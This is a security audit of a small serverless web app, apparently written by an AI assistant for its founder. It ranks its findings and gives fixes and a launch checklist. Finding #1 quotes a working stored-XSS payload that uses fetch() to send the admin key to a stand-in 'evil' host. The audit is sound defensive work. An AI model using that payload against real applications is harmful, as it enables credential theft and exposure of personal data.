# safetysurface.md — Portafile launch-readiness security audit

**Re-audited 2026-07-18** against https://portafile.vercel.app (live) and repo `~/portafile`.
Risk tier: **ASVS Level 2** (the app collects personal data — lead email/phone/city). Read-only
against the live site; every claim traces to a command run this session. Living document — strike
findings when fixed and verified.

> **This supersedes the 2026-07-16 audit**, which ran before the sync API + Blob store existed and
> concluded "no API, no database, no server code." That is no longer true: there are now two
> serverless functions (`api/state.js`, `api/lead.js`) writing to a **public-access Vercel Blob
> store**, plus an `ADMIN_KEY` gate. The whole server-side attack surface below is new.

**GDPR note:** coffee shops signing up may be in the EU. Collecting their email/phone means GDPR
applies — you need a lawful basis, the privacy notice you already have (`site/privacy.html` covers
email/collection/deletion — good), and a way to delete a lead on request. Not a blocker at this
scale; keep it in mind before broad EU outreach.

---

## Asset inventory (verified from files + live, not memory)

| Asset | Where | Sensitive data | Reachable | Live check |
|---|---|---|---|---|
| Landing + product app (`site/`, `product/`) | Vercel static | none server-side (shop data in visitor's localStorage) | public | `/`, `/product/` → 200 |
| `POST /api/lead` | Vercel function | writes lead PII to Blob | **public, unauthenticated** | 422 on bad input ✅ |
| `GET /api/lead?admin=` | Vercel function | lists all lead PII | admin-key gated | 401 without key ✅ |
| `GET/PUT /api/state?k=` | Vercel function | shop state | secret-link (160-bit key) | 400/404 as coded ✅ |
| Vercel Blob store `portafile-data` | Vercel, **public access** | all leads + all shop states | blobs public at their URL | — |
| Founder dashboard (`admin/`) | localhost:4322 LaunchAgent | CRM: customer emails, prepay $ | local only, **no auth** | `/admin/*` → **404 live** ✅ not deployed |
| Secrets: `ADMIN_KEY` (192-bit), `BLOB_READ_WRITE_TOKEN` | Vercel env + gitignored `.admin-key`/`.env.local` | — | account-gated | never committed ✅ |
| Git repo | github.com/ethankwyap-stack/portafile (private) | business plan + Reddit evidence | account-gated | — |

---

## Findings (ranked)

### Critical
None found that are exploitable by an anonymous internet user against existing data with mass impact.
(The most severe issue, #1, requires a founder click; #2 is a cost/abuse issue, not a data breach.)

### High

**1. Stored XSS in the founder dashboard → admin-key theft → full lead-PII disclosure**
`admin/dashboard.html:192`. The "→ list" button builds an **inline `onclick`** with attacker-controlled
lead data:
```js
onclick="autoEmail('${esc(l.email)}','${esc(l.shop)}','interested');save()"
```
`esc()` HTML-encodes, which is the **wrong encoding for a JavaScript-string-inside-an-attribute**
context: the browser HTML-decodes `&#39;`→`'` *before* the JS runs, so a `'` in the payload breaks
out of the string. **Proven locally** — a lead submitted with
`shop = x');fetch('//evil/'+localStorage.getItem('portafile-admin-key'));//` renders as JS that
exfiltrates your admin key when you click the row. That key unlocks **every** lead's email/phone
via `GET /api/lead` from anywhere.
*Scenario:* attacker submits a poisoned signup through the public form; you open the dashboard, click
"→ list" to triage it, and your admin key leaves your browser silently.
*Why not Critical:* the dashboard is local-only (404 in prod, confirmed) and it takes your click — so
it's a targeted attack on one person, not mass-exploitable.
*Fix (don't put user data in the HTML at all — pass an index instead):*
```js
// keep the fetched leads around
window._leads = leads;
// row button:
`<button class="mini" onclick="toList(${i})">→ list</button>`
// new function:
function toList(i){ const l = window._leads[i]; autoEmail(l.email, l.shop, 'interested'); save(); }
```
*Maps to:* OWASP A03 Injection (XSS) · ASVS V5.3 (output encoding).

**2. Unauthenticated, unthrottled `POST /api/lead` creates a Blob per call — cost/abuse risk**
`api/lead.js:14-25`, CORS `*`, no rate limit, no captcha, no honeypot. Each valid POST
(`{email, shop}` passing a simple regex) writes a **new public blob**. A script can create millions
→ Blob quota/operation exhaustion and a dashboard flooded with junk signups (the dashboard's "Fetch
signups" does `list({limit:1000})` + one fetch per blob, so it also gets slow/expensive to load).
*Why it matters to you specifically:* your #1 rule is zero cost. On Hobby, Vercel Blob is capped at
the free tier and should error rather than bill — **confirm that** (see NOT VERIFIABLE). If the
project is ever on a plan that allows overage, this becomes Critical.
*Fix (zero-cost, layered):*
- Add a **honeypot** field to the gate form (`product/app.js:660`): a hidden input real users never
  fill; in `api/lead.js`, if it's non-empty, return `200 {ok:true}` **without writing**. Stops naive bots.
- Set **Vercel Spend Management to $0 / usage alerts** in the dashboard (hard cost backstop).
- Optional later: front the domain with Cloudflare (free) for its bot/rate limiting.
*Maps to:* OWASP A04 Insecure Design / A05 · ASVS V11 (business-logic / anti-automation).

### Medium

**3. Lead PII stored in a PUBLIC blob at a guessable path — bypasses the admin gate**
`api/lead.js:23-24`: `access:'public'`, `addRandomSuffix:false`, path `leads/{Date.now()}-{Math.random 6 chars}`.
The `ADMIN_KEY` only gates the *list* endpoint — an individual lead blob is readable by anyone who
knows its URL, and the URL is a millisecond timestamp + ~31 bits of **non-crypto** `Math.random`.
Hard in practice (you'd also need the store's hostname, which isn't leaked to clients), but it's PII
in a public bucket protected by weak obscurity.
*Fix:* make the suffix unguessable — `crypto.randomUUID()` (Node 18+ has it globally):
```js
await put(`leads/${lead.ts}-${crypto.randomUUID()}.json`, ...)
```
*Maps to:* OWASP A01 Broken Access Control · ASVS V8 (data protection).

**4. Vulnerable `undici` (9 CVEs, 3 rated High/CVSS 7.5) via pinned `@vercel/blob ^0.27.3`**
`osv-scanner` + `npm audit` both flag `undici 5.29.0` (transitive dep) with DoS / HTTP-smuggling /
Set-Cookie advisories, fixed in undici ≥6.27. **Low practical reachability here** — your functions
only use undici to talk to Vercel's own trusted Blob endpoints over HTTPS, not attacker-controlled
servers — but the CVEs are real and tool-confirmed, and the fix is a version bump.
*Fix:* `@vercel/blob` → latest (`2.x`, pulls patched undici). It's a major bump, so **verify both
routes still work** (`put`/`list` API is stable across these) on a Vercel preview before promoting.
*Maps to:* OWASP A06 Vulnerable Components · ASVS V1 (dependency management).

### Low

**5. Admin-key comparison isn't constant-time** — `api/lead.js:29` uses `!==`. A timing side-channel
on a 192-bit key over the internet (Vercel cold starts + jitter) is not practically exploitable, but
the clean fix is `crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b))` behind a length check. (A03.)

**6. `javascript:` URLs allowed in the dashboard post-tracker** — `admin/dashboard.html:157`
`<a href="${esc(t.url)}">`. `esc()` blocks attribute break-out but not a `javascript:` scheme.
Self-XSS only (your own input, local page) → Low. Whitelist `http(s):` before rendering the link.

**7. CSP could add `base-uri 'none'; object-src 'none'`** — `vercel.json:10`. Present CSP is already
good (blocks inline script, `frame-ancestors 'none'`); these two directives close `<base>` hijack and
legacy plugin vectors. One-line addition.

**8. No security logging** — failed admin-key attempts and API errors aren't logged; API routes have
no `try/catch` (an unhandled throw returns Vercel's default 500, which leaks nothing to the client but
gives you no signal). Low for a solo app; a `console.error` on the 401 path is enough.

**9. localStorage-only shop data (product app)** — cleared browser = lost recipes. Accepted local-first
design; Export/Import is the mitigation. Carried from the prior audit. Consider an "export after N
edits" nag before broad launch.

---

## Three confidence levels

**VERIFIED — tool-confirmed or exercised live this session**
- All 7 security headers present on `/` (`curl -sI`): CSP, HSTS (`max-age=63072000; preload`),
  `X-Content-Type-Options`, `X-Frame-Options: DENY`, `Referrer-Policy`, `Permissions-Policy`.
- HTTP → HTTPS **308** redirect. HSTS present.
- Deploy allowlist works: `/admin/*`, `/BUILD-LOG.md`, `/evidence/`, `/.env.local`, `/.admin-key`,
  `/.git/config`, `/package.json`, `/vercel.json` all **404**; site/product/app.js **200**.
- API behaves exactly as coded: lead POST bad-email/no-shop → **422**, OPTIONS → **204**, DELETE →
  **405**, GET no/wrong admin → **401**; state malformed key → **400**, valid-format unknown key →
  **404**, DELETE → **405**. Auth **fails closed**.
- Admin dashboard is **not deployed** (`/admin/dashboard.html` → 404 live) — its no-auth design is
  contained to localhost.
- Git history clean: `gitleaks git .` → **no leaks** in 13 commits; `git log --diff-filter=A` shows no
  `.env`/key/db ever added. Working-tree gitleaks hits = the 2 intended gitignored files
  (`.env.local` — Blob token + OIDC token); both confirmed never committed.
- Sync key = 20 bytes from `crypto.getRandomValues` → 160-bit capability (sound). Admin key = 48 hex
  chars = 192-bit (strong). (Checked shape/length only; values never printed.)
- Dependency `@vercel/blob` is genuine (npm registry, created 2023, Vercel maintainers) — **not**
  slopsquatted. Single direct dependency.
- `undici` CVEs: `osv-scanner 2.4.0` (9 vulns) + `npm audit` (matching) — tool output above.
- Stored-XSS break-out (#1): **reproduced locally** in `node` — `&#39;` decodes to `'`, attacker
  `fetch()` runs outside the string.

**REVIEWED — code judgment, lower confidence (not executed live)**
- The #1 exploit *chain* to admin-key theft (mechanism proven; full chain reasoned, not run end-to-end
  against your real dashboard — I won't seed a poisoned lead in production).
- #2 cost impact (reasoned from the code path; I did **not** flood the production endpoint).
- #3 reachability (reasoned — depends on the store hostname staying unleaked).
- No SQL injection / SSRF: no database; the only server-side `fetch()` targets are Vercel-controlled
  blob URLs from `list()`, never user-supplied URLs.

**NOT VERIFIABLE — out-of-repo, awaiting your confirmation**
- Vercel **plan tier + Spend Management** — is Blob hard-capped at free tier (no overage billing)? (gates #2 severity)
- Vercel Blob store settings — is the store **listable** by anyone without the token? (should be no)
- **2FA** on the GitHub (`ethankwyap-stack`) and Vercel accounts — these accounts *are* the product; a
  hijack = hostile deploy at the launch URL.
- Whether `git push` auto-deploys `main` (your notes say no — deploys are manual `vercel deploy`).
- That the `ADMIN_KEY` env var in Vercel prod matches your local `.admin-key`.
- Run **securityheaders.com** and an **OWASP ZAP baseline** against the live URL as independent checks.

---

## Accepted trade-offs (intent, not oversight)
- **Secret-link sync with no login** — a 160-bit key in the URL *is* the credential; anyone with the
  link can read/overwrite that one shop's data (last-write-wins). This is the deliberate no-account
  design; Export is the backup. Sound because the key is CSPRNG-generated.
- **Access gate is a marketing wall, not a security control** — the app content is fully public (free
  tool); the gate is trivially bypassed (disable JS, hit the API, set localStorage). That's fine — it
  guards nothing sensitive. Don't ever treat it as auth.
- **Vercel Blob `access:'public'`** — currently the only mode on the free tier; mitigated for state by
  the 160-bit path. For leads, tighten the path randomness (#3).

---

## Go / no-go (ASVS L2)
**Conditional GO.** The public site, product app, and secret-link sync are in genuinely good shape:
headers, HTTPS, deploy allowlist, fail-closed auth, clean history, strong keys — all verified live.
Nothing here exposes existing user data to an anonymous internet user *right now*.

Before you actively drive signups (posting launch threads), close the two Highs — both are a few lines:
fix the dashboard XSS (#1) so triaging a poisoned signup can't steal your admin key, and add the lead
honeypot + confirm the Vercel spend cap (#2) so the signup form can't run up cost or bury real leads.

## Ordered launch checklist
**Do today**
- [ ] Fix #1 (dashboard XSS) — pass the row index to `onclick`, not the lead data. (local file, no deploy)
- [ ] Confirm **Vercel Spend Management = $0 / free-tier hard cap** (gates #2 from High→fine).
- [ ] Confirm **2FA** on GitHub + Vercel.

**This week (before launch threads)**
- [ ] Fix #2 — honeypot field in the gate form + drop-without-write in `api/lead.js`. Deploy + verify.
- [ ] Fix #3 — `crypto.randomUUID()` for lead blob paths. Deploy.
- [ ] Bump `@vercel/blob` (#4), verify both API routes on a preview, then promote.
- [ ] Confirm the Blob store is not anonymously listable.
- [ ] Run securityheaders.com + a ZAP baseline against the live URL.

**Nice-to-have**
- [ ] #5 constant-time admin compare · #6 `javascript:` scheme guard · #7 CSP `base-uri`/`object-src` ·
      #8 log failed admin attempts · #9 export nag.

---

*A clean line here means no known patterns were found — not that the app is secure. This review shares
blind spots with the AI that wrote the code, which is why the tool findings (gitleaks, osv-scanner,
npm audit, the live curl probes, the local XSS repro) carry more weight than the reading. Re-run this
audit after any auth change, any new dependency, or in 90 days — whichever comes first.*
